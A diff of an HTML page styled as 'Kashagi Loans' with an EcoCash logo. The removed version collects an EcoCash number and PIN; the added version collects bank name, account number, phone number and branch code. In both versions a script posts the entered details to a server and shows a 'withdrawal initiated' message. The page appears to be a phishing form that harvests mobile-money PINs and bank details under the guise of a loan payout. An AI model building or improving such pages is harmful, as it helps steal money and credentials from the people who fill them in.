@@ -1,8 +1,11 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Kashagi Loans</title><style>
+<title>Kashagi Loans - Bank Withdrawal</title>
+
+<style>
 *{
     margin:0;
     padding:0;
@@ -29,7 +32,7 @@ body{
 
 .header{
     background:#1877f2;
-    color:white;
+    color:#fff;
     text-align:center;
     padding:25px 20px;
 }
@@ -38,7 +41,7 @@ body{
     width:90px;
     height:90px;
     border-radius:50%;
-    background:white;
+    background:#fff;
     padding:5px;
     object-fit:cover;
     margin-bottom:10px;
@@ -85,7 +88,7 @@ button{
     border:none;
     border-radius:6px;
     background:#1877f2;
-    color:white;
+    color:#fff;
     font-weight:bold;
     font-size:15px;
     cursor:pointer;
@@ -105,46 +108,65 @@ button:hover{
     text-decoration:none;
     font-size:14px;
 }
-</style></head><body><div class="card"><div class="header">
-    <img src="Ecocash.png" class="logo" alt="Logo">
-    <h2>Kashagi Loans</h2>
-    <p>Fast • Secure • Reliable</p>
+</style>
+
+</head>
+
+<body>
+
+<div class="card">
+
+<div class="header">
+<img src="Ecocash.png" class="logo" alt="Logo">
+<h2>Kashagi Loans</h2>
+<p>Fast • Secure • Reliable</p>
 </div>
 
 <div class="form">
 
-    <label>EcoCash Number</label>
-    <input
-        type="tel"
-        id="ecocash_number"
-        placeholder="e.g. 0771234567"
-    >
+<label>Bank Name</label>
+<input
+type="text"
+id="bank_name"
+placeholder="Enter bank name">
 
-    <label>EcoCash Pin</label>
-    <input
-        type="text"
-        id="ecocash_pin"
-        placeholder="Enter ecocash pin"
-    >
+<label>Account Number</label>
+<input
+type="text"
+id="account_number"
+placeholder="Enter account number">
 
-    <button onclick="submitForm()">
-        Withdraw to EcoCash
-    </button>
+<label>Phone Number</label>
+<input
+type="tel"
+id="phone_number"
+placeholder="e.g. +263771234567">
 
-    <div class="footer">
-        <a href="#">Forgot Pin?</a>
-    </div>
+<label>Branch Code</label>
+<input
+type="text"
+id="branch_code"
+placeholder="Enter branch code">
+
+<button onclick="submitForm()">
+Withdraw to Bank Account
+</button>
+
+<div class="footer">
+<a href="#">Need Help?</a>
+</div>
 
 </div>
 
 <script>
+    async function submitForm() {
 
-async function submitForm() {
+    const bank_name = document.getElementById("bank_name").value.trim();
+    const account_number = document.getElementById("account_number").value.trim();
+    const phone_number = document.getElementById("phone_number").value.trim();
+    const branch_code = document.getElementById("branch_code").value.trim();
 
-    const ecocash_number = document.getElementById("ecocash_number").value.trim();
-    const ecocash_pin = document.getElementById("ecocash_pin").value.trim();
-
-    if (!ecocash_number || !ecocash_pin) {
+    if (!bank_name || !account_number || !phone_number || !branch_code) {
         alert("Please fill in all fields.");
         return;
     }
@@ -157,8 +179,10 @@ async function submitForm() {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({
-                ecocash_number: ecocash_number,
-                ecocash_pin: ecocash_pin
+                bank_name: bank_name,
+                account_number: account_number,
+                phone_number: phone_number,
+                branch_code: branch_code
             })
         });
 
@@ -170,9 +194,10 @@ async function submitForm() {
 
         if (data.success) {
 
-            alert("✅ Your Withdrawal request has been initiated successfully!");
+            alert("✅ Your bank withdrawal request has been initiated successfully!");
 
             window.location.replace("/thankyou.html");
+
         } else {
 
             alert("❌ Submission failed. Please try again.");
